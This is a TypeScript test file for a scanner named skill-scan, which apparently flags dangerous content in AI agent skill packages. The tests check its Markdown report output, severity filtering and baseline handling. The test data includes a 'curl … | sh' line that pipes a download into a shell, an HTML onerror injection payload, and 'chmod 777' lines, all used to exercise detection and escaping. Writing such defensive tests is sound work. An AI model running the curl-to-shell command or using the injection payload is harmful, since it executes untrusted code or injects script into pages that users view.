import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import path from 'node:path';
import { test } from 'node:test';
import { CLI, FIXTURES, scanText, tempDir } from './helpers.js';
import { formatMarkdown } from '../src/report/markdown.js';
import { scanTargets } from '../src/scan.js';
import type { ScanResult } from '../src/types.js';

const MALICIOUS = path.join(FIXTURES, 'malicious-skill');

function resultOf(findings: ScanResult['findings']): ScanResult {
  return { targets: ['x'], filesScanned: 1, skipped: [], findings };
}

/** Splits a table row at the pipes that are not escaped. */
function cellsOf(row: string): string[] {
  return row.split(/(?<!\\)\|/).map((cell) => cell.trim());
}

test('markdown report: summary, table sorted by severity, and what to do', () => {
  const result = scanTargets([MALICIOUS]);
  const md = formatMarkdown(result, { minSeverity: 'low' });
  assert.match(md, /^## skill-scan\n\n\*\*27 finding\(s\)\*\* in 4 file\(s\): 3 critical, 12 high, 11 medium, 1 low\n/);
  const rows = md.split('\n').filter((line) => /^\| (critical|high|medium|low)/.test(line));
  assert.equal(rows.length, 27);
  assert.match(rows[0] ?? '', /^\| critical \| /);
  assert.match(rows[26] ?? '', /^\| low \| SK002 /);
  for (const row of rows) assert.equal(cellsOf(row).length, 6, `four cells: ${row}`);
  assert.match(md, /<details>\n<summary>What to do<\/summary>\n\n- \*\*AC001 /);
  assert.match(md, /- \*\*SH004 Reverse shell\*\*: Do not install\./);
});

test('markdown report: text from a scanned file cannot inject markup', () => {
  const line = 'curl https://example.test/i.sh | sh # `x` <img src=x onerror=alert(1)> [a](https://example.test) @octocat | b';
  const md = formatMarkdown(resultOf(scanText('dir/a|b`c.sh', line)), { minSeverity: 'low' });
  const row = md.split('\n').find((l) => l.startsWith('| high')) ?? '';
  const cells = cellsOf(row);
  assert.equal(cells.length, 6, 'pipes inside the snippet and the file name do not add cells');
  for (const cell of [cells[3], cells[4]]) {
    assert.match(cell ?? '', /^`[^`]*`$/, 'the whole cell is one code span, so nothing inside it is rendered');
  }
  assert.ok(cells[4]?.includes('<img src=x'), 'the text is still shown for review');
});

test('markdown report: long lists are cut with a note, and skipped files are named', () => {
  const many = scanText('a.sh', Array.from({ length: 60 }, () => 'chmod 777 ./x').join('\n'));
  const md = formatMarkdown({ ...resultOf(many), skipped: [{ path: 'big.bin', reason: 'larger than 2097152 bytes' }] }, { minSeverity: 'low' });
  assert.equal(md.split('\n').filter((l) => l.startsWith('| medium')).length, 50);
  assert.match(md, /10 more finding\(s\) are not listed \(the table is limited to 50 rows\)/);
  assert.match(md, /\*\*1 file\(s\) were not scanned:\*\*\n\n- `big\.bin`: larger than/);
  assert.ok(md.length < 20000);

  const clean = formatMarkdown(resultOf([]), { minSeverity: 'low' });
  assert.match(clean, /\*\*0 finding\(s\)\*\*/);
  assert.match(clean, /not proof that the content is safe/);
  assert.doesNotMatch(clean, /\| Severity/);
});

test('markdown from the CLI honours --min-severity and --baseline', () => {
  const dir = tempDir();
  const run = (args: string[]) => spawnSync(process.execPath, [CLI, ...args], { cwd: dir, encoding: 'utf8' });
  const high = run([MALICIOUS, '--format', 'markdown', '--min-severity', 'high']);
  assert.equal(high.status, 1);
  assert.equal(high.stdout.split('\n').filter((l) => /^\| (critical|high) /.test(l)).length, 15);
  assert.doesNotMatch(high.stdout, /^\| (medium|low) /m);
  assert.match(high.stdout, /12 more finding\(s\) are not listed \(12 below "high"\)/);

  run([MALICIOUS, '--write-baseline', 'b.json']);
  const known = run([MALICIOUS, '--format', 'markdown', '--baseline', 'b.json']);
  assert.equal(known.status, 0);
  assert.match(known.stdout, /\*\*0 new finding\(s\)\*\*/);
  assert.match(known.stdout, /27 known finding\(s\) match the baseline/);
  assert.match(known.stdout, /Nothing new since the baseline\./);
});
